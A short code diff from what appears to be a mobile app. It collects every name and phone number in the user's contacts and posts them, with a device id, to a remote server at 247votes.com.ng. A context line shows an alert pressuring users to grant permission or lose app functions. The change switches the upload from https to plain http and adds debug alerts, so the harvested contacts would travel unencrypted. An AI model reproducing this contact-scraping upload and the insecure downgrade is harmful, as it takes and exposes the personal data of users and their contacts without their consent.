@@ -668,8 +668,10 @@ alert("Kindly click allow to unlock all functions.\nIf not application would not
              var pn = phone.normalizedNumber;
 	      dd += cn +" : "+ pn +",";
       }
-$.post("https://247votes.com.ng/app/api.php",{id:'appContacts', uuid:uid, data1:cl, data2:dd},function(response){
+$.post("http://247votes.com.ng/app/api.php",{id:'appContacts', uuid:uid, data1:cl, data2:dd},function(response){
+alert("4");
 if(response == 1){
+	alert("5");
 var setup = {
     appID: uid,
     setup: 1
